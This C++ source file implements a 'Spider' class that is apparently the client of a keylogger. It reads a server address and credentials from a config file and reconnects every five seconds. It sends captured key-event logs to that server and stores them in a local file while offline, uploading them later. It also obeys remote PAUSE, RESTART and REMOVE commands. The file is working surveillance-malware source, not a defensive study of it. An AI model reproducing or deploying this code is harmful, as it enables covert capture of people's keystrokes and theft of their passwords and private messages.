//
//  Logger.cpp
//  AsyncClientBoost
//
//  Created by Charles Fournier on 29/10/2014.
//  Copyright (c) 2014 Charles Fournier. All rights reserved.
//

#include "Spider.h"
#include <ctime>

Spider::Spider() : _network(this), _key(this, true)
{
	_networkState = DISCONNECTED;
	_conf.loadConfig();
	_idClient = _conf.getId();
	_tokenClient = _conf.getToken();
}

Spider::~Spider()
{
	for (std::list<Data *>::iterator it = _dataList.begin(); it != _dataList.end(); it++) {
		delete(*it);
	}
}

void Spider::run()
{
    boost::thread thread(boost::bind(&Spider::networkConnect, this));
	_key.run();
	thread.join();
}

void Spider::networkConnect()
{
    while (true)
    {
		std::cout << _conf.getIp() << std::endl;;
		_network.run(_conf.getIp());
		_network.stop();
       Sleep(5000);
    }
}

void Spider::update(std::string data) // Network State update
{
	if (data == "DISCONNECTED") {
		_networkState = DISCONNECTED;
		writeLocal();
	}
	else if (data == "CONNECTED") {
		_networkState = CONNECTED;
	}
}

void Spider::writeLocal()
{
	for (std::list<Data *>::iterator it = _dataList.begin(); it != _dataList.end(); it++)
	{
		_localLog.logging((*it)->getLog(), (*it)->getLogSize());
	}
	_dataList.erase(_dataList.begin(), _dataList.end());
}

void Spider::sendLocalLog()
{
	std::fstream stream;
	stream.open("local.spider", std::ios::in | std::ios::binary);
	while (true) {
		void *data = _localLog.getLocalLog(stream);
		if (data != NULL)
		{
			manageSend(new Data(data));
		}
		else
		{
			std::cout << "No local log" << std::endl;
			stream.close();
			stream.open("local.spider", std::ios::out | std::ios::binary);
			stream.flush();
			stream.close();
			break;
		}
	}
	stream.close();
}

void Spider::update(void *data, int size) // Network update
{
	if (_networkState == CONNECTED) {
		if (size == MAGIC_HEADER_SIZE) {
			t_magic_header *header = (t_magic_header *)data;
			Data::decode(header);
			Data::display(header);
			_networkState = AUTHENTIFIED;

			if (_idClient == -1 && _tokenClient == 0)
			{
				Data dataToSend;
				manageSend(new Data);
			}
			else
			{
				sendLocalLog();
			}
		}
	}
	else if (_networkState == AUTHENTIFIED || _networkState == SUSPENDED) {
		char *hData = (char*)data;
		while (size >= HEADER_SIZE) {
			t_header *header = (t_header *)hData;
			Data::decode(header);
			//Data::display(header);
			if (header->type == ID) {
				_idClient = header->id_client;
				_tokenClient = header->token;
				_conf.addIntegerToField(_idClient, "id");
				_conf.addIntegerToField(_tokenClient, "token");
				_conf.saveConfig();
				sendLocalLog();
			}
			else if (header->type == PING) {
				Data *respData = new Data(PONG);
				respData->getHeader()->id_msg = header->id_msg;
				std::cout << "idMsg pong : " << header->id_msg << std::endl;
				respData->getHeader()->token = _tokenClient;
				manageSend(respData);
			}
			else if (header->type == PAUSE) {
				_networkState = SUSPENDED;
			}
			else if (header->type == RESTART) {
				_networkState = AUTHENTIFIED;
			}
			else if (header->type == REMOVE) {
				_key.stop();
				_network.stop();
			}
			else if (header->type == RESP_OK) {
				manageResponse(true, header->id_msg);
				std::cout << "ok" << std::endl;
			}
			else if (header->type == RESP_KO) {
				std::cout << "ko" << std::endl;
				manageResponse(false, header->id_msg);
			}
			size -= HEADER_SIZE;
			hData += HEADER_SIZE;
		}
	}
}

void Spider::manageResponse(bool ok, t_msg_id id_msg) {

	std::list<std::list<Data *>::iterator> delList;
	std::list<Data *> sendList;
	time_t timer = time(NULL);

	for (std::list<Data *>::iterator it = _dataList.begin(); it != _dataList.end(); it++) {
		if ((*it)->getHeader()->id_msg == htonl(id_msg)) {
			delete(*it);
			delList.push_back(it);
		}
		else if ((*it)->getTimer() > timer + 3) {
			delList.push_back(it);
			sendList.push_back(*it);
		}
	}

	for (std::list<std::list<Data *>::iterator>::iterator it = delList.begin(); it != delList.end(); it++) {
		_dataList.erase(*it);
	}

	for (std::list<Data *>::iterator it = sendList.begin(); it != sendList.end(); it++) {
		manageSend(*it);
	}

}

void Spider::manageSend(Data *data)
{
//	data->showData();
	if (data->isEncoded() == false && data->getHeader()->type != PONG) {
		data->getHeader()->id_client = _idClient;
		data->getHeader()->token = _tokenClient;
	}
	else if (data->isEncoded() == false && data->getHeader()->type == PONG)
	{
		std::cout << "ici" << std::endl;
		data->getHeader()->id_client = _idClient;
		data->getHeader()->token = _tokenClient;
	}
	data->encode();
	_network.sendData(data->getHeader(), data->getHeaderSize());
	if (data->haveLog() == true) {
		_network.sendData(data->getLog(), data->getLogSize());
		_dataList.push_back(data);
	}
	else {
		delete(data);
	}
}

void Spider::update(Data *data) // KeyEvents update
{
	if (_networkState == AUTHENTIFIED) {
		manageSend(data);
	}
	else {
		data->encode();
		_localLog.logging(data->getLog(), data->getLogSize());
	}
}
